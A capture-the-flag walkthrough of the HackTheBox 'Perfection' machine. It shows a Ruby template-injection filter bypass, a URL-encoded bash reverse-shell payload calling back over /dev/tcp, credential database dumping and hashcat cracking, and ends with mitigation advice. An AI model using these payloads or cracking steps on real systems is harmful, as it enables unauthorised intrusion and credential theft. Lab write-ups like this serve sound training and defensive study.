# Perfection - Ashbo3n

Machine **Name:** <span class="htb-text-primary htb-font-medium avatar-icon-name-details__name htb-heading-lg htb-font-bold" title="Perfection">Perfection</span>

**Platform:** HTB

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Weak Credentials, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Misconfiguration, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Server Side Template Injection (SSTI)</span>

### Initial Shell - SSTI

We will start with nmap, we are using nmap to know the 'open' ports and services running on the **target** as well as services names, services version's, running nmap's default list on the target and lastly what OS is being used, we will use the command:

```bash
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap
```

**Nmap Output:**

```bash
Nmap scan report for 10.129.229.121
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2026-01-18 11:08:17 IST for 29s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Weighted Grade Calculator
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 18 11:08:46 2026 -- 1 IP address (1 host up) scanned in 31.03 seconds
```

### Enumeration

**Whatweb**

whatweb is a CLI tool that guesses which services and there version could be running on the target server.

```
http://10.129.229.121/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.129.229.121], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

#### Exploitation

Go to [http://10.129.229.121/weighted-grade-calc](http://10.129.229.121/weighted-grade-calc), you can see we can calculate weighted grade, put any values in them however enter 20 on weights input field, and intercept that request, After intercepting send it to repeat, there when we edit category 1 to be {{7\*7}} it replies as Malicious input blocked, so now i wanted to know what chars are allowed and which aren't to do that I changed category 1 to be FUZZ and saved the request as Perfect.req, you can name it anything, now we can use ffuf with Special char wordlist from seclists, Command goes:

```bash
ffuf -c -request Perfect.req -request-proto http -w /usr/share/wordlists/seclists/Fuzzing/special-char-url-encoded.txt -t 60 -fs 5221
```

<details id="bkmrk-explanation-of-comma"><summary>Explanation Of Command</summary>

-c for colored output, Perfect.req is my http request which i saved earlier from brup, -request-proto sets the method for request, -w for wordlist which is special char url encoded from seclists, -t for threads

</details>**Output**

```bash
%2F                     [Status: 200, Size: 5284, Words: 1181, Lines: 144, Duration: 475ms]
/                       [Status: 200, Size: 5284, Words: 1181, Lines: 144, Duration: 516ms]
+                       [Status: 200, Size: 5284, Words: 1182, Lines: 144, Duration: 546ms]
```

%2F is allowed, but i also want to see if NULL char and new line char which is %0a and %00 will be allowed or not, so let's test that manually.

%0a works, note that if you do not put any number before %0a it will be blocked, for example `category1=%0a` will be blocked but `category1=33%0a` will work.

Now to actually exploit the vulnerability, i gone to hacktricks SSTI page, here's a URL -&gt; [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

There i found this payload: `<%= 7*7 %>` when entered on the vulnerable parameter it should return 49.

```bash
     Your total grade is 1%<p>22
49: 0%</p><p>20: 0%</p>
```

Note: you have to URL encode the payload which will then become: `22%0a<%25%3d+7*7+%25>` Now we can execute commands like ls or whoami with this payload:

```python
<%= `ls /` %>
```

 We just have to change the command in quotes. Command executed:

```bash
       <p>Please enter a maximum of five category names, your grade in them out of 100, and their weight. Enter "N/A" into the category field and 0 into the grade and weight fields if you are not using a row.</p>
      </form>
      Your total grade is 1%<p>22
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
: 0%</p>
```

Now we can just get reverse shell with this command: `echo 'bash -i >& /dev/tcp/[YourIP]/4444 0>&1' |base64|base64 -d | bash` Just URL encode it and paste the command in the payload we had earlier, and start a listener on your attacking machine, the URL encoded command with earlier payload is:

```bash
22%0a<%25%3d+`echo+'bash+-i+>%26+/dev/tcp/10.10.15.197/4444+0>%261'+|base64|base64+-d+|+bash`+%25>
```

Just remove anything you have in category 1 parameter, and paste this, also don't forget to change the IP and port

<details id="bkmrk-explanation-of-rever"><summary>Explanation of Reverse Shell Payload</summary>

22 is a filler value without it %0a will be detected, then we are using echo to print our payload in terminal, then using pipe we base64 encoding it then with another pipe we are base64 decoding it and lastly we are invoking bash which will run the payload.

</details>Got the shell, you can find user flag in susan home dir:

```bash
susan@perfection:~/ruby_app$ ls
main.rb  public  views
susan@perfection:~/ruby_app$ 

```

### Root shell - Weak Password

In /var/mail found a mail named susan, this is the content:

```bash
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Found a file named `pupilpath_credentials.db` at `/home/susan/Migration` I transfered it to my attacking machine and opened it via sqlite3.

```bash
┌──(root㉿kali)-[~/…/Easy/Perfection/Artifacts/DB]
└─# sqlite3 pupilpath_credentials.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite>
```

transfer the hashes into a .txt file, name could be anything, Here's the plan, we know the pattern by letter, which is based on the pattern `{firstname}_{firstname backwards}_`

<table data-path-to-node="3" id="bkmrk-user-first-name-base" style="margin-bottom: 32px; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><thead style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**User**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**First Name**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Base Pattern**</td></tr></thead><tbody style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,1,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Susan Miller**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,1,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">susan</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,1,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">`susan_nasus_`</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,2,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Tina Smith**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,2,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">tina</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,2,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">`tina_anit_`</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,3,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Harry Tyler**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,3,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">harry</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,3,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">`harry_yrrah_`</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,4,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**David Lawrence**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,4,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">david</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,4,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">`david_divad_`</span></td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,5,0,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">**Stephen Locke**</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,5,1,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">stephen</span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><span data-path-to-node="3,5,2,0" style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">`stephen_nehpets_`</span></td></tr></tbody></table>

We will use hashcat for it, first create a file which has all usernames in it, i named it base.txt, here are all the usernames:

```
susan_nasus_
tina_anit_
harry_yrrah_
david_divad_
stephen_nehpets_
```

Then create a .txt and put a hashes into it, here are all the hashes:

```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

And lastly run the hashcat command:

```bash
hashcat -m 1400 -a 6 targets.hash bases.txt ?d?d?d?d?d?d?d?d?d?d --increment
```

Found password for susan:

```bash
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:Redacted
```

Now just do sudo su and you should get a root shell.

Mitigations

#### 1. Secure Against Server-Side Template Injection (SSTI)

<span data-path-to-node="3,1"><span class="citation-46">The initial entry was gained by bypassing a blocklist to execute Ruby code via the WEBrick server</span></span><span data-path-to-node="3,2"><span class="citation-46 citation-end-46"><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup></span></span><span data-path-to-node="3,3">.</span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,0">**<span class="citation-45">Implement Robust Input Validation:</span>**<span class="citation-45"> Move away from simple blocklists (which were bypassed using a newline character </span>`<span class="citation-45">%0a</span>`<span class="citation-45">)</span></span><span data-path-to-node="4,0,1,1"><span class="citation-45 citation-end-45"><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup></span></span><span data-path-to-node="4,0,1,2">. </span><span data-path-to-node="4,0,1,4"><span class="citation-44">Instead, use an "allow-list" approach that only permits expected alphanumeric characters</span></span><span data-path-to-node="4,0,1,5"><span class="citation-44 citation-end-44"><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44">**<span class="citation-43">Context-Aware Output Encoding:</span>**<span class="citation-43"> Ensure that any user-supplied data rendered in a template is properly escaped for the specific context (HTML, JavaScript, etc.) to prevent the execution of embedded code</span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,0">**<span class="citation-42">Use Sandbox Environments:</span>**<span class="citation-42"> If user-provided templates are a business requirement, run the template engine in a restricted sandbox with minimal privileges and no access to dangerous functions like system command execution</span></span><span data-path-to-node="4,2,1,1"><span class="citation-42 citation-end-42"><sup class="superscript" data-turn-source-index="5"></sup><sup class="superscript" data-turn-source-index="5"></sup><sup class="superscript" data-turn-source-index="5"></sup><sup class="superscript" data-turn-source-index="5"></sup></span></span><span data-path-to-node="4,2,1,2">.</span></span></span></span></span>

#### <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2">2. Strengthen Password Policies</span></span></span></span></span>

<span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,1"><span class="citation-41">The root escalation was possible because the password followed a predictable pattern involving the user's name and a numeric suffix</span></span><span data-path-to-node="6,2"><span class="citation-41 citation-end-41"><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup></span></span><span data-path-to-node="6,3">.</span></span></span></span></span></span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,0,1,0">**<span class="citation-40">Enforce Password Complexity:</span>**<span class="citation-40"> Prohibit passwords that contain the user’s name, username, or easily guessable patterns</span></span><span data-path-to-node="7,0,1,1"><span class="citation-40 citation-end-40"><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup></span></span><span data-path-to-node="7,0,1,2">.</span></span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,0">**<span class="citation-39">Eliminate Predictable Formats:</span>**<span class="citation-39"> Avoid standardized password schemas (e.g., </span>`<span class="citation-39">{firstname}_{firstname backwards}_{integer}</span>`<span class="citation-39">) as these allow attackers to use targeted brute-force attacks with tools like Hashcat</span></span><span data-path-to-node="7,1,1,1"><span class="citation-39 citation-end-39"><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup></span></span><span data-path-to-node="7,1,1,2">.</span></span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,0">**<span class="citation-38">Use Strong Hashing Algorithms:</span>**<span class="citation-38"> While SHA-256 was used, the lack of a "salt" for each individual user made the hashes more susceptible to cracking once the pattern was discovered</span></span><span data-path-to-node="7,2,1,1"><span class="citation-38 citation-end-38"><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup></span></span><span data-path-to-node="7,2,1,2">.</span></span></span></span></span></span></span></span>

#### <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2">3. Secure Sensitive Local Information</span></span></span></span></span></span></span></span>

<span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,1"><span class="citation-37">The attacker discovered sensitive credentials in local mail and database files</span></span><span data-path-to-node="9,2"><span class="citation-37 citation-end-37"><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup><sup class="superscript" data-turn-source-index="10"></sup></span></span><span data-path-to-node="9,3">.</span></span></span></span></span></span></span></span></span>

- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,0,1,0">**<span class="citation-36">Restrict Access to System Mail:</span>**<span class="citation-36"> Ensure that </span>`<span class="citation-36">/var/mail/</span>`<span class="citation-36"> files have strict permissions so that only the intended user and root can read them</span></span><span data-path-to-node="10,0,1,1"><span class="citation-36 citation-end-36"><sup class="superscript" data-turn-source-index="11"></sup><sup class="superscript" data-turn-source-index="11"></sup></span></span><span data-path-to-node="10,0,1,2">.</span></span></span></span></span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,0">**<span class="citation-35">Secure Database Files:</span>**<span class="citation-35"> Sensitive files like </span>`<span class="citation-35">pupilpath_credentials.db</span>`<span class="citation-35"> should not be stored in user home directories with broad read permissions</span></span><span data-path-to-node="10,1,1,1"><span class="citation-35 citation-end-35"><sup class="superscript" data-turn-source-index="12"></sup><sup class="superscript" data-turn-source-index="12"></sup></span></span><span data-path-to-node="10,1,1,2">.</span></span></span></span></span></span></span></span></span></span>
- <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="10,2,1,0">**<span class="citation-34">Principle of Least Privilege:</span>**<span class="citation-34"> Limit the </span>`<span class="citation-34">sudo</span>`<span class="citation-34"> capabilities of the </span>`<span class="citation-34">susan</span>`<span class="citation-34"> user to prevent a simple transition to root after a password is compromised</span></span><span data-path-to-node="10,2,1,1"><span class="citation-34 citation-end-34"><sup class="superscript" data-turn-source-index="13"></sup><sup class="superscript" data-turn-source-index="13"></sup></span></span><span data-path-to-node="10,2,1,2">.</span></span></span></span></span></span></span></span></span></span></span>

### <span data-path-to-node="3,3"><span data-path-to-node="4,0,1,4"><span class="citation-44"><span class="citation-43"><span data-path-to-node="4,2,1,2"><span data-path-to-node="6,3"><span data-path-to-node="7,1,1,2"><span data-path-to-node="7,2,1,2"><span data-path-to-node="9,3"><span data-path-to-node="10,1,1,2"><span data-path-to-node="10,2,1,2">Summary of Mitigations</span></span></span></span></span></span></span></span></span></span></span>

<table border="1" id="bkmrk-vulnerability-area-f" style="border-collapse: collapse; width: 100%; height: 202.333px;"><colgroup><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col></colgroup><tbody><tr style="height: 29.6333px;"><td style="height: 29.6333px;">**<span data-path-to-node="13,0,0,0">Vulnerability Area</span>**</td><td style="height: 29.6333px;">**Finding**</td><td style="height: 29.6333px;">**<span data-path-to-node="13,0,2,0">Mitigation Strategy</span>**</td></tr><tr style="height: 48.3167px;"><td style="height: 48.3167px;">Web Entry (SSTI)</td><td style="height: 48.3167px;"><span data-path-to-node="13,1,1,0,1"><span class="citation-33">Bypassed input filters using </span>`<span class="citation-33">%0a</span>`<span class="citation-33"> to execute Ruby code</span></span><span data-path-to-node="13,1,1,0,2"><span class="citation-33 citation-end-33"><sup class="superscript" data-turn-source-index="14"></sup><sup class="superscript" data-turn-source-index="14"></sup><sup class="superscript" data-turn-source-index="14"></sup><sup class="superscript" data-turn-source-index="14"></sup></span></span><span data-path-to-node="13,1,1,0,3">.</span></td><td style="height: 48.3167px;"><span data-path-to-node="13,1,2,0,1"><span class="citation-32">Implement strict allow-lists and use context-aware escaping in templates</span></span><span data-path-to-node="13,1,2,0,2"><span class="citation-32 citation-end-32"><sup class="superscript" data-turn-source-index="15"></sup><sup class="superscript" data-turn-source-index="15"></sup><sup class="superscript" data-turn-source-index="15"></sup><sup class="superscript" data-turn-source-index="15"></sup></span></span><span data-path-to-node="13,1,2,0,3">.</span></td></tr><tr style="height: 65.1167px;"><td style="height: 65.1167px;">Credential Security</td><td style="height: 65.1167px;"><span data-path-to-node="13,2,1,0,1"><span class="citation-31">Password pattern was predictable: </span>`<span class="citation-31">{name}_{reverse_name}_{int}</span>`</span><span data-path-to-node="13,2,1,0,2"><span class="citation-31 citation-end-31"><sup class="superscript" data-turn-source-index="16"></sup><sup class="superscript" data-turn-source-index="16"></sup><sup class="superscript" data-turn-source-index="16"></sup></span></span><span data-path-to-node="13,2,1,0,3">.</span></td><td style="height: 65.1167px;"><span data-path-to-node="13,2,2,0,1"><span class="citation-30">Enforce complex password policies and forbid the use of personal info in passwords</span></span><span data-path-to-node="13,2,2,0,2"><span class="citation-30 citation-end-30"><sup class="superscript" data-turn-source-index="17"></sup></span></span><span data-path-to-node="13,2,2,0,3">.</span></td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">Information Leakage</td><td style="height: 29.6333px;"><span data-path-to-node="13,3,1,0,1"><span class="citation-29">Sensitive data found in </span>`<span class="citation-29">/var/mail</span>`<span class="citation-29"> and a local </span>`<span class="citation-29">.db</span>`<span class="citation-29"> file</span></span><span data-path-to-node="13,3,1,0,2"><span class="citation-29 citation-end-29"><sup class="superscript" data-turn-source-index="18"></sup><sup class="superscript" data-turn-source-index="18"></sup><sup class="superscript" data-turn-source-index="18"></sup><sup class="superscript" data-turn-source-index="18"></sup></span></span><span data-path-to-node="13,3,1,0,3">.</span></td><td style="height: 29.6333px;"><span data-path-to-node="13,3,2,0,1"><span class="citation-28">Restrict file system permissions and avoid storing cleartext/weakly hashed credentials</span></span><span data-path-to-node="13,3,2,0,2"><span class="citation-28 citation-end-28"><sup class="superscript" data-turn-source-index="19"></sup><sup class="superscript" data-turn-source-index="19"></sup><sup class="superscript" data-turn-source-index="19"></sup><sup class="superscript" data-turn-source-index="19"></sup></span></span><span data-path-to-node="13,3,2,0,3">.</span><div _ngcontent-ng-c1654451460="" class="source-inline-chip-container ng-star-inserted">  
</div></td></tr><tr style="height: 29.6333px;"><td style="height: 29.6333px;">Privilege Escalation</td><td style="height: 29.6333px;"><span data-path-to-node="13,4,1,1,0">`<span class="citation-27">susan</span>`<span class="citation-27"> had </span>`<span class="citation-27">sudo</span>`<span class="citation-27"> rights and a crackable password</span></span><span data-path-to-node="13,4,1,1,1"><span class="citation-27 citation-end-27"><sup class="superscript" data-turn-source-index="20"></sup><sup class="superscript" data-turn-source-index="20"></sup><sup class="superscript" data-turn-source-index="20"></sup><sup class="superscript" data-turn-source-index="20"></sup></span></span><span data-path-to-node="13,4,1,1,2">.</span></td><td style="height: 29.6333px;"><span data-path-to-node="13,4,2,0,1"><span class="citation-26">Limit </span>`<span class="citation-26">sudo</span>`<span class="citation-26"> access and use salted, slow-hashing algorithms (like Argon2 or bcrypt)</span></span><span data-path-to-node="13,4,2,0,2"><span class="citation-26 citation-end-26"><sup class="superscript" data-turn-source-index="21"></sup><sup class="superscript" data-turn-source-index="21"></sup><sup class="superscript" data-turn-source-index="21"></sup><sup class="superscript" data-turn-source-index="21"></sup></span></span><span data-path-to-node="13,4,2,0,3">.</span></td></tr></tbody></table>